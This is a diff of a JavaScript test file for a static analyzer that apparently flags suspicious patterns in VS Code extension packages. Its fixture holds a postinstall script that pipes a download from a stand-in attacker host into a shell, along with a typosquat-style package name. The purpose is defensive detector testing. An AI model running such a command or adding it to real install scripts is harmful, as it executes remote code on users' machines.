@@ -309,31 +309,61 @@ eval(someCode);
   });
 
   it('should detect suspicious patterns in package.json', async () => {
-    // Add postinstall script and typosquat indicator to package.json
-    const pkgPath = join(testExtensionDir, 'package.json');
-    const pkg = JSON.parse(readFileSync(pkgPath, 'utf-8'));
-    pkg.scripts = {
-      postinstall: 'curl http://evil.example.com/install.sh | sh',
-    };
-    pkg.name = 'vscode-microsoft-helper'; // matches typosquat_indicator pattern
-    writeFileSync(pkgPath, JSON.stringify(pkg, null, 2));
+    const tempDir = `/tmp/test-pkg-json-${Date.now()}`;
+    if (existsSync(tempDir)) rmSync(tempDir, { recursive: true, force: true });
+    mkdirSync(tempDir, { recursive: true });
+
+    const pkgPath = join(tempDir, 'package.json');
+    writeFileSync(pkgPath, JSON.stringify({
+      name: 'vscode-microsoft-helper', // matches typosquat_indicator pattern
+      version: '1.0.0',
+      scripts: {
+        postinstall: 'curl http://evil.example.com/install.sh | sh',
+      },
+    }, null, 2));
 
     try {
-      const analyzer = new StaticAnalyzer(testExtensionDir, { verbose: false });
+      const analyzer = new StaticAnalyzer(tempDir, { verbose: false });
       const result = await analyzer.analyze();
 
-      // Check that findings include postinstall_script or typosquat_indicator patterns
       const jsonPatternFindings = result.findings.filter(f =>
         f.location.includes('package.json') &&
         (f.title.toLowerCase().includes('postinstall') || f.title.toLowerCase().includes('typosquat'))
       );
       expect(jsonPatternFindings.length).toBeGreaterThan(0);
     } finally {
-      // Restore original package.json without the suspicious fields
-      const origPkg = JSON.parse(readFileSync(pkgPath, 'utf-8'));
-      delete origPkg.scripts;
-      origPkg.name = 'test-extension';
-      writeFileSync(pkgPath, JSON.stringify(origPkg, null, 2));
+      if (existsSync(tempDir)) rmSync(tempDir, { recursive: true, force: true });
+    }
+  });
+
+  it('should skip lockfiles during pattern matching', async () => {
+    const tempDir = `/tmp/test-lockfile-skip-${Date.now()}`;
+    if (existsSync(tempDir)) rmSync(tempDir, { recursive: true, force: true });
+    mkdirSync(tempDir, { recursive: true });
+
+    writeFileSync(join(tempDir, 'package.json'), JSON.stringify({
+      name: 'clean-extension',
+      version: '1.0.0',
+    }, null, 2));
+
+    // package-lock.json contains a postinstall-like string that would otherwise match
+    writeFileSync(join(tempDir, 'package-lock.json'), JSON.stringify({
+      name: 'clean-extension',
+      packages: {
+        'node_modules/some-dep': {
+          scripts: { postinstall: 'node build.js' },
+        },
+      },
+    }, null, 2));
+
+    try {
+      const analyzer = new StaticAnalyzer(tempDir, { verbose: false });
+      const result = await analyzer.analyze();
+
+      const lockfileFindings = result.findings.filter(f => f.location.includes('package-lock.json'));
+      expect(lockfileFindings.length).toBe(0);
+    } finally {
+      if (existsSync(tempDir)) rmSync(tempDir, { recursive: true, force: true });
     }
   });
 });
